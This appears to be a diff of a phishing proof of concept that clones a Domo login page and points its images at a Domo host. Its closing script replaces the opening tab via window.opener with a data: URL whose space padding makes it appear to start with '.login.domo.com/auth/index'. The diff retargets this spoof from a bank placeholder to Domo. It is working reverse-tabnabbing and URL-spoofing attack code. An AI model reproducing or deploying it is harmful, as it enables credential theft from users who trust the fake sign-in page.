@@ -8,7 +8,7 @@
   <meta name="viewport" content="width=device-width, user-scalable=no">
   <meta name="theme-color" content="#F6F6F6">
   <meta name="apple-mobile-web-app-capable" content="yes">
-  <link rel="shortcut icon" type="image/png" href="/public/images/favicon.ico">
+  <link rel="shortcut icon" type="image/png" href="https://example.domo.com/public/images/favicon.ico">
   <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300" rel="stylesheet" type="text/css">
 
   <style type="text/css">/*! jQuery UI - v1.9.2 - 2012-12-18
@@ -91,7 +91,7 @@ SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
     <div class="login-form clearfix">
       <div class="form-container">
         <div class="header">
-          <!-- ngIf: !view.isCustomerWhitelabeled --><img ng-if="!view.isCustomerWhitelabeled" src="/public/images/logo-400.png" class="brand vertical-align-middle ng-scope" width="100" height="100" alt=""><!-- end ngIf: !view.isCustomerWhitelabeled -->
+          <!-- ngIf: !view.isCustomerWhitelabeled --><img ng-if="!view.isCustomerWhitelabeled" src="https://example.domo.com/public/images/logo-400.png" class="brand vertical-align-middle ng-scope" width="100" height="100" alt=""><!-- end ngIf: !view.isCustomerWhitelabeled -->
           <!-- ngIf: view.customerHash && !view.isCustomerWhitelabeled -->
           <!-- ngIf: view.customerHash -->
         </div>
@@ -118,9 +118,6 @@ SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
             </p>
 
             <div class="login-btn"><button class="sign-in db-button" theme="primary" size="large" name="submit" ng-disabled="verifying" style="margin-right: 3px;" tabindex="1"><ng-transclude><span class="ng-binding ng-scope">Sign In</span></ng-transclude></button></div>
-            <div class="margin-top-xsmall text-align-center ng-hide" ng-show="view.showSSOBackButton">
-              <a ng-click="setView('sso-signin'); showSSOBackButton(false);" class="ng-binding">Back to Single Sign-On</a>
-            </div>
 
             <div class="footer">
               <div class="float-right" style="line-height: 33px;">
@@ -166,7 +163,7 @@ SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
   <div class="footer-wrapper text-align-center ng-hide" ng-show="view.isCustomerWhitelabeled">
     <div>
       <span class="text-transform-uppercase color-gray-5 font-size-small ng-binding">Powered by</span><br>
-      <img src="/public/images/logo-400.png" class="vertical-align-middle margin-top-xsmall" width="50" height="50" alt="">
+      <img src="https://example.domo.com/public/images/logo-400.png" class="vertical-align-middle margin-top-xsmall" width="50" height="50" alt="">
     </div>
   </div>
 </div>
@@ -217,7 +214,7 @@ var html = document.getElementById('codez').innerHTML;
 console.log(html)
 
 if (window.opener) {
-  window.opener.location = 'data:text/html;.login.bank.com/auth/index' + spaces + ',' + escape(html);
+  window.opener.location = 'data:text/html;.login.domo.com/auth/index' + spaces + ',' + escape(html);
 }
 
 </script>
